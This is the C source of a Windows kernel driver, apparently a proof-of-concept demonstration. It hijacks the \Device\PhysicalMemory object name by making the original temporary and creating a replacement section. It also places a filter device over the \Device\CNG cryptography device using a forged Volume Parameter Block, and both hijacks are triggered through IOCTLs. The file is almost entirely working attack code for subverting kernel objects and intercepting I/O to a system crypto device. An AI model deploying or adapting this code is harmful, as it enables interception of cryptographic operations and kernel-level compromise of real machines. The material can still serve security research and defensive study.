#include <ntifs.h>
#include <ioctl.h>

// -----------------------------------------------------------------------------
// Function Prototypes
// -----------------------------------------------------------------------------

// Prototype for the driver's entry point
DRIVER_INITIALIZE DriverEntry;

// Prototype for the driver's unload routine
DRIVER_UNLOAD DriverUnload;

// Prototype for the generic IRP handler
DRIVER_DISPATCH DispatchForward;

// Prototypes for IRP dispatch routines related to device open, cleanup, and close
DRIVER_DISPATCH DispatchCreateClose;

// Prototype for the IRP read dispatch routine
DRIVER_DISPATCH DispatchRead;

// Prototype for the IRP device control dispatch routine
DRIVER_DISPATCH DispatchDeviceControl;


// -----------------------------------------------------------------------------
// Data Structures
// -----------------------------------------------------------------------------

// Structure to define the filter extension which points to the target device
typedef struct _FILTER_EXTENSION
{
    PDEVICE_OBJECT TargetDevice;
} FILTER_EXTENSION, * PFILTER_EXTENSION;


// -----------------------------------------------------------------------------
// Global Variables
// -----------------------------------------------------------------------------

// Global device object for control operations
PDEVICE_OBJECT g_ControlDevice;

// Global filter device object that sits atop the target device
PDEVICE_OBJECT g_FilterDevice;

// Mutex to enforce required threading for IOCTL processing
KMUTEX g_DeviceControlMutex;

// -----------------------------------------------------------------------------
// External Variables
// -----------------------------------------------------------------------------

// External pointer to the object type of memory sections
// This is likely resolved from another part of the kernel or another driver module
extern POBJECT_TYPE* MmSectionObjectType;

// -----------------------------------------------------------------------------
// External Prototypes
// -----------------------------------------------------------------------------

// Function to retrieve and reference an object address given the object name
NTKERNELAPI
NTSTATUS
ObReferenceObjectByName(
    PUNICODE_STRING ObjectName,
    ULONG Attributes,
    PACCESS_STATE AccessState,
    ACCESS_MASK DesiredAccess,
    POBJECT_TYPE ObjectType,
    KPROCESSOR_MODE AccessMode,
    PVOID ParseContext,
    PVOID* Object
);

// -----------------------------------------------------------------------------

/**
 * Hijacks the physical memory by manipulating the object associated with the device.
 * 
 * @return NTSTATUS indicating the result of the operation.
 */
NTSTATUS HijackPhysicalMemory(VOID)
{
    NTSTATUS ntStatus;
    UNICODE_STRING name;  // Holds the name of the device object we're interested in
    PVOID object;         // Will hold the reference to the device object
    OBJECT_ATTRIBUTES oa; // Object attributes for creating a new section
    LARGE_INTEGER size;   // Size of the memory section we intend to create
    HANDLE section;       // Handle to the newly created memory section

    // Initialize the Unicode string with the name of the physical memory device
    RtlInitUnicodeString(&name, L"\\Device\\PhysicalMemory");

    // Attempt to get a reference to the device object by its name
    ntStatus = ObReferenceObjectByName(&name, 0, NULL, 0, *MmSectionObjectType, KernelMode, NULL, &object);
    if (!NT_SUCCESS(ntStatus)) {
        return ntStatus; // Return if failed to get the reference
    }

    // Make the referenced object temporary (so that it can be deleted)
    ObMakeTemporaryObject(object);

    // Debug information to print the status
    DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, "Removed name from object 0x%p\n", object);

    // Set the attributes for creating a new memory section
    InitializeObjectAttributes(&oa, &name, OBJ_CASE_INSENSITIVE, NULL, NULL);

    // Define the size of the memory section
    size.QuadPart = 0x1000 * 10;

    // Create a new memory section with the specified attributes and size
    ntStatus = ZwCreateSection(&section, SECTION_ALL_ACCESS, &oa, &size, PAGE_READWRITE, SEC_COMMIT, NULL);
    if (NT_SUCCESS(ntStatus)) {

        // Obtain a reference to the newly created section
        ntStatus = ObReferenceObjectByHandle(section, 0, *MmSectionObjectType, KernelMode, &object, NULL);

        // Assert to ensure success, ideally, you should handle the error properly
        ASSERT(NT_SUCCESS(ntStatus));

        // Debug information to print the status of the operation
        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, "New object for %wZ: 0x%p\n", &name, object);        
    }

    return ntStatus;
}

/**
 * Forwards the incoming IRP (I/O Request Packet) to the target device, if available.
 * 
 * @param DeviceObject The device object the IRP is intended for.
 * @param Irp          The I/O Request Packet.
 * 
 * @return NTSTATUS indicating the result of the operation.
 */
NTSTATUS DispatchForward(PDEVICE_OBJECT DeviceObject, PIRP Irp)
{
    // Obtain the device extension to retrieve the filter's context
    PFILTER_EXTENSION deviceExtension = (PFILTER_EXTENSION)DeviceObject->DeviceExtension;
    
    // Get the current IRP stack location to access its parameters
    PIO_STACK_LOCATION irpSp = IoGetCurrentIrpStackLocation(Irp);

    // If no device extension found, the request is invalid for our driver
    if (!deviceExtension) {
        Irp->IoStatus.Status = STATUS_INVALID_DEVICE_REQUEST;
        Irp->IoStatus.Information = 0;
        
        // Complete the IRP without forwarding to any other driver
        IoCompleteRequest(Irp, IO_NO_INCREMENT);

        return STATUS_SUCCESS;  // Even though the request was invalid, we've handled it successfully
    }
    else {
        // For debugging: Log information about the request type (major function)
        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, "Received MajorFunction %u to filter device\n", irpSp->MajorFunction);

        // Skip the current stack location, i.e., avoid processing in our driver and forward
        IoSkipCurrentIrpStackLocation(Irp);
        
        // Forward the IRP to the target device
        return IoCallDriver(deviceExtension->TargetDevice, Irp);
    }
}

/**
 * Handles CREATE and CLOSE requests for the device. These requests are forwarded to 
 * the target device if applicable.
 * 
 * @param DeviceObject The device object the IRP is intended for.
 * @param Irp          The I/O Request Packet.
 * 
 * @return NTSTATUS indicating the result of the operation.
 */
NTSTATUS DispatchCreateClose(PDEVICE_OBJECT DeviceObject, PIRP Irp)
{
    // Obtain the device extension to retrieve the filter's context
    PFILTER_EXTENSION deviceExtension = (PFILTER_EXTENSION)DeviceObject->DeviceExtension;

    // If no device extension found, the request is for our control device - return success
    if (!deviceExtension) {
        Irp->IoStatus.Status = STATUS_SUCCESS;
        Irp->IoStatus.Information = 0;
        
        // Complete the IRP without forwarding to any other driver
        IoCompleteRequest(Irp, IO_NO_INCREMENT);

        return STATUS_SUCCESS;
    }
    else {
        // For debugging: Log information indicating the device has received an OPEN request
        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, "Received OPEN request to filter device\n");

        // Skip the current stack location to avoid processing in our driver and forward
        IoSkipCurrentIrpStackLocation(Irp);
        
        // Forward the IRP to the target device
        return IoCallDriver(deviceExtension->TargetDevice, Irp);
    }
}

/**
 * Hijacks the device stack by replacing the VPB (Volume Parameter Block) 
 * of the target device with a custom VPB.
 * 
 * @note The VPB allocated by this routine will not be deallocated as part
 * of normal device destruction through IoDeleteDevice, it must be done
 * manually.
 * 
 * @return NTSTATUS indicating the result of the operation.
 */
NTSTATUS HijackDeviceStack(VOID)
{
    // Get the device extension to retrieve the filter's context
    PFILTER_EXTENSION deviceExtension = g_FilterDevice->DeviceExtension;
    
    // Allocate memory for a new VPB structure
    PVPB vpb = ExAllocatePoolWithTag(NonPagedPool, sizeof(*vpb), ' bpV');

    // If memory allocation failed, return appropriate status
    if (!vpb) {
        return STATUS_INSUFFICIENT_RESOURCES;
    }

    // Zero out the memory for the new VPB structure
    RtlZeroMemory(vpb, sizeof(*vpb));

    // Initialize the new VPB structure's fields
    vpb->Type = IO_TYPE_VPB;
    vpb->Size = sizeof(*vpb);
    vpb->RealDevice = deviceExtension->TargetDevice;
    vpb->DeviceObject = g_FilterDevice;
    SetFlag(vpb->Flags, VPB_MOUNTED);

    // Intentionally access and modify the Vpb field of the real device object
    // The warning is suppressed as this is intentional and demonstration purpose
#pragma warning(suppress: 28175) 
    vpb->RealDevice->Vpb = vpb;

    return STATUS_SUCCESS;
}

/**
 * Handles device control requests (IOCTLs) for the device. Depending on the IOCTL,
 * it either processes the request directly or forwards it to the target device.
 * 
 * @param DeviceObject The device object the IRP is intended for.
 * @param Irp          The I/O Request Packet.
 * 
 * @return NTSTATUS indicating the result of the operation.
 */
NTSTATUS DispatchDeviceControl(PDEVICE_OBJECT DeviceObject, PIRP Irp)
{
    NTSTATUS ntStatus;
    // Get the current IRP stack location to access its parameters
    PIO_STACK_LOCATION irpSp = IoGetCurrentIrpStackLocation(Irp);

    // Obtain the device extension to retrieve the filter's context
    PFILTER_EXTENSION deviceExtension = (PFILTER_EXTENSION)DeviceObject->DeviceExtension;

    // The device object parameter is not used elsewhere in the function
    UNREFERENCED_PARAMETER(DeviceObject);
    
    // If no device extension found, the request will be processed directly
    if (!deviceExtension) {
        // Acquire the mutex
        KeWaitForSingleObject(&g_DeviceControlMutex, Executive, KernelMode, FALSE, NULL);

        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, "Received IOCTL to control device\n");

        // Switch on the IOCTL to determine the action
        switch (irpSp->Parameters.DeviceIoControl.IoControlCode)
        {
        case IOCTL_HIJACK_NAME:
            ntStatus = HijackPhysicalMemory();
            break;

        case IOCTL_HIJACK_STACK:
            ntStatus = HijackDeviceStack();
            break;

        default:
            // If the IOCTL isn't recognized, set an invalid request status
            ntStatus = STATUS_INVALID_DEVICE_REQUEST;
        }

        // It's not safe to unload after these hijacks, no object/state cleanup is done
        if (NT_SUCCESS(ntStatus)) {
            DeviceObject->DriverObject->DriverUnload = NULL;
        }

        // Release the mutex
        KeReleaseMutex(&g_DeviceControlMutex, FALSE);
        
        // Set the IRP's status and complete the request
        Irp->IoStatus.Status = ntStatus;
        Irp->IoStatus.Information = 0;
        IoCompleteRequest(Irp, IO_NO_INCREMENT);
    }
    else {
        // If there's a device extension, it suggests the request should be forwarded
        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, "Received IOCTL to filter device\n");

        // Skip our driver's processing and forward the request to the target device
        IoSkipCurrentIrpStackLocation(Irp);
        ntStatus = IoCallDriver(deviceExtension->TargetDevice, Irp);
    }

    return ntStatus;
}

/**
 * Called when the driver is about to be unloaded. Responsible for cleanup operations.
 * 
 * @param DriverObject The object representing this driver.
 */
VOID DriverUnload(_In_ PDRIVER_OBJECT DriverObject)
{
    // The DriverObject parameter is not used elsewhere in the function
    UNREFERENCED_PARAMETER(DriverObject);

    // Delete the control device created during driver initialization
    IoDeleteDevice(g_ControlDevice);

    // Debug message to log the completion of the unload routine
    DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, "DriverUnload complete\n");
}

/**
 * Entry point for the driver. Called by the system when the driver is loaded.
 * 
 * @param DriverObject  Represents the instance of this driver in the system.
 * @param RegistryPath  The registry path provided to the driver.
 * 
 * @return NTSTATUS indicating the result of the operation.
 */
NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_STRING RegistryPath)
{
    NTSTATUS ntStatus;
    ULONG ii;
    UNICODE_STRING deviceName;
    PFILE_OBJECT hijackFile;
    PDEVICE_OBJECT hijackDevice;
    PFILTER_EXTENSION deviceExtension;

    // The RegistryPath parameter is not used elsewhere in the function
    UNREFERENCED_PARAMETER(RegistryPath);

    // Trigger a breakpoint for debugging purposes
    __debugbreak();

    // Debug message to log the driver's entry
    DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, "DriverEntry invoked\n");

    // Assign the unload routine
    DriverObject->DriverUnload = DriverUnload;

    // Default all major function handlers to DispatchForward
    for (ii = 0; ii <= IRP_MJ_MAXIMUM_FUNCTION; ii++)
    {
        DriverObject->MajorFunction[ii] = DispatchForward;
    }

    // Set specific handlers for CREATE, CLEANUP, CLOSE, and DEVICE_CONTROL
    DriverObject->MajorFunction[IRP_MJ_CREATE] = DispatchCreateClose;
    DriverObject->MajorFunction[IRP_MJ_CLEANUP] = DispatchCreateClose;
    DriverObject->MajorFunction[IRP_MJ_CLOSE] = DispatchCreateClose;
    DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = DispatchDeviceControl;

    // Create a mutex to ensure DispatchDeviceControl can only be called by one thread at a time
    KeInitializeMutex(&g_DeviceControlMutex, 0);

    // Create a device named NTDEVICE_NAME_STRING
    RtlInitUnicodeString(&deviceName, NTDEVICE_NAME_STRING);
    ntStatus = IoCreateDevice(DriverObject, 0, &deviceName, FILE_DEVICE_UNKNOWN, FILE_DEVICE_SECURE_OPEN, FALSE, &g_ControlDevice);
    if (!NT_SUCCESS(ntStatus)) {
        return ntStatus;
    }

    // Get device object pointer for device named "\\Device\\CNG"
    RtlInitUnicodeString(&deviceName, L"\\Device\\CNG");
    ntStatus = IoGetDeviceObjectPointer(&deviceName, 0, &hijackFile, &hijackDevice);
    if (!NT_SUCCESS(ntStatus)) {
        IoDeleteDevice(g_ControlDevice);
        return ntStatus;
    }

    // Create a filter device for hijacking
    ntStatus = IoCreateDevice(DriverObject, sizeof(FILTER_EXTENSION), NULL, hijackDevice->DeviceType, hijackDevice->Characteristics, FALSE, &g_FilterDevice);
    if (!NT_SUCCESS(ntStatus)) {
        ObDereferenceObject(hijackFile);
        IoDeleteDevice(g_ControlDevice);
        return ntStatus;
    }

    // Set the device stack size and initialize the filter device's extension
    g_FilterDevice->StackSize = hijackDevice->StackSize + 1;

    deviceExtension = (PFILTER_EXTENSION)g_FilterDevice->DeviceExtension;
    deviceExtension->TargetDevice = hijackDevice;

    // Set and clear flags for the filter device based on the hijacked device
    SetFlag(g_FilterDevice->Flags, FlagOn(hijackDevice->Flags, DO_BUFFERED_IO | DO_DIRECT_IO | DO_SUPPORTS_TRANSACTIONS));
    ClearFlag(g_FilterDevice->Flags, DO_DEVICE_INITIALIZING);

    // Dereference the hijacked file as it's no longer needed
    ObDereferenceObject(hijackFile);

    return ntStatus;
}

